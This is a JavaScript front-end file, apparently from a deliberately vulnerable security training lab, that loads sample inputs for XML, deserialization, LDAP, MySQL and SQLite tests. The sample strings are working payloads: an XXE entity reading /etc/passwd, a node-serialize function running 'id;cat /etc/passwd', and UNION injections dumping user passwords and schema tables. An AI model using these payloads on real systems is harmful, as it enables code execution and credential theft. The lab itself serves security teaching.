function addSample(sampleName) {
    $("#InputArea").val(hack[sampleName]["sample"]);
}

function addConfig(sampleName) {
    $("#HackConfig").val(hack[sampleName]["config"]);
}

function showRef(testname, reftype) {
    window.open(hack[testname][reftype], `HackRefWin-${reftype}`);
}

function runProcessor(processor) {
    let indent = 0;
    if ($("#PrettifyOutput").prop("checked")) indent = 4;

    $("#OutputArea").val("");
    let inputData = $("#InputArea").val();
    let hackConfig = $("#HackConfig").val();
    restRunHackTool(processor, inputData, hackConfig, function (data) {
        if (data !== null && data !== undefined) {
            $("#OutputArea").val(JSON.stringify(data, null, indent));
        } else $("#OutputArea").val(JSON.stringify("ERROR, review logs"));
    });
}

function switchTest() {
    let testname = $("#HackToolSel").val();
    console.info(`Switching test to ${testname}`);
    addSample(testname);
    addConfig(testname);
    $("#PrettifyLabel").prop("hidden", false);
    $("#PrettifyOutput").prop("hidden", false);
    $("#RunHack").prop("hidden", false);
    $("#HackHelp").prop("hidden", false);
    $("#DevHelp").prop("hidden", false);
    $("#GenHelp").prop("hidden", false);
    $("#HackConfig").prop("hidden", false);
}

function runTest() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Running test ${testname}`);
        runProcessor(testname);
    }
}

function showHackHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing hacking help for test ${testname}`);
        showRef(testname, "hackref");
    }
}

function showDevHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing dev help for test ${testname}`);
        showRef(testname, "devref");
    }
}

function showGenHelp() {
    let testname = $("#HackToolSel").val();
    if (testname !== null) {
        console.info(`Showing generic help for test ${testname}`);
        showRef(testname, "genref");
    }
}

let hack = {
    xmlparser: {
        hackref: "https://portswigger.net/web-security/xxe",
        devref: "https://www.npmjs.com/package/libxmljs",
        genref: "https://xmlwriter.net/xml_guide/entity_declaration.shtml",
        //owasp: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
        //intro2: "https://www.w3schools.com/xml/xml_dtd_intro.asp",
        config: `noent=true&noblanks=true`,
        sample: `<!DOCTYPE foo [<!ELEMENT foo ANY >
    <!ENTITY bar SYSTEM "file:///etc/passwd" >]>
    <products>
    <product> <name>PS3</name> <description>&bar;</description> </product>
    <product> <name>PS4</name> <description>Gaming Console</description> </product>
    </products>`,
    },
    jsondeser: {
        hackref:
            "https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/",
        devref: "https://www.npmjs.com/package/node-serialize",
        genref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a8-insecure-deserialization.md",
        //owasp: "",
        sample: `{"msg":"See server log for RCE :-)","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
        config: ``,
    },
    ldapsearch: {
        hackref:
            "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html",
        devref: "http://ldapjs.org/client.html",
        genref: "https://mariadb.com/kb/en/select/",
        sample: `{"bind":{"dn":"uid=tesla,dc=example,dc=com","password":"password"},"search":{"base":"dc=example,dc=com","options":{}}}`,
        config: `url=ldap://ldap.forumsys.com:389&timeout=3000&connectTimeout=3000`,
    },
    mathjs: {
        hackref:
            "https://github.com/appsecco/dvna/blob/master/docs/solution/a9-using-components-with-known-vulnerability.md",
        devref: "https://mathjs.org/docs/expressions/parsing.html",
        genref: "https://mathjs.org/docs/expressions/parsing.html",
        sample: "",
        config: "",
    },
    mysql: {
        hackref: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
        devref: "https://www.npmjs.com/package/mysql",
        genref: "https://mariadb.com/kb/en/select/",
        sample: `SELECT table_schema,table_name,table_type FROM information_schema.tables UNION SELECT host,user,password from mysql.user;`,
        config: `host=localhost&user=tester&database=mysql&password=Passw0rd123`,
    },
    sqlite: {
        hackref:
            "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md",
        devref: "https://www.npmjs.com/package/sqlite3",
        genref: "https://www.sqlitetutorial.net",
        sample: `select "NORMAL_DATA" as "INPUT",Name,ArtistId,"" as Extra from artists where Name like "AC/%" and 1=1\nUNION select "SQLITE_VERSION", sqlite_version(),"",""\nUNION select "SQLITE_DATE", datetime('now','localtime'),"",""\nUNION select "SQLITE_TABLE",name,tbl_name,type from sqlite_master where type="table" ;\n\npragma module_list;\npragma database_list;\npragma function_list;\n`,
        config: `dbFile=/app/utils/chinook.db`,
    },
};
